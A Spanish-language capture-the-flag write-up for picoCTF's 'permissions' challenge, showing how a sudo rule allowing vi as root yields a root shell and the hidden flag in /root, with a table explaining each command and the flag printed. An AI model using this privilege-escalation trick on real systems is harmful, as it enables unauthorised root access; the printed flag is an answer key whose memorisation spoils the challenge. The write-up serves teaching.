## RETO
permissions
## DESCRIPCION
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
## SOLUCION
MarianaRodriguez-picoctf@webshell:~$ ==ssh -p 64262 picoplayer@saturn.picoctf.net==
.
.
.
picoplayer@challenge:~$ ==whoami==
picoplayer
picoplayer@challenge:~$ ==sudo -l==
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    **(ALL) /usr/bin/vi**
picoplayer@challenge:~$ ==sudo vi test==

root@challenge:/home/picoplayer# ==whoami==
root
root@challenge:/home/picoplayer# ==ls -la==   
total 24
drwxr-xr-x 1 picoplayer picoplayer    37 Feb 14 06:54 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer  3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer    34 Feb 14 06:48 .cache
-rw-r--r-- 1 picoplayer picoplayer   807 Feb 25  2020 .profile
-rw------- 1 root       root       12288 Feb 14 06:54 .test.swp
root@challenge:/home/picoplayer# ==cd==        
root@challenge:~# ==ls -la==
total 16
drwx------ 1 root root   22 Feb 14 06:54 .
drwxr-xr-x 1 root root   63 Feb 14 06:45 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
**-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt**
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  759 Feb 14 06:54 .viminfo
root@challenge:~# ==cat .flag.txt==
**picoCTF{uS1ng_v1m_3dit0r_f6ad392b}**

## NOTAS ADICIONALES

| whoami                      | Te dice exactamente **quién eres** en el sistema (el nombre del usuario actual). Es útil para saber si ya logramos entrar como `root` o seguimos siendo un usuario normal.                           |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| sudo -l                     | **Lista tus privilegios.** Te muestra qué comandos podemos ejecutar usando `sudo` (como administrador) sin conocer la contraseña de root o bajo qué condiciones.                                     |
| sudo vi                     | Abre el editor de texto **vi** con permisos de superusuario.                                                                                                                                         |
| ls -la                      | **Lista todos los archivos** del directorio actual. La `-l` muestra detalles (dueño, tamaño, fecha) y la `-a` muestra los **archivos ocultos** (los que empiezan con un punto, como el `.flag.txt`). |
| cd                          | Te lleva a tu **carpeta personal (home)**.                                                                                                                                                           |
| cat ."nombre del documento" | **Muestra el contenido** de un archivo oculto directamente en la pantalla. Es el comando estándar para leer banderas (flags) una vez que las encuentras.                                             |

## REFERENCIAS
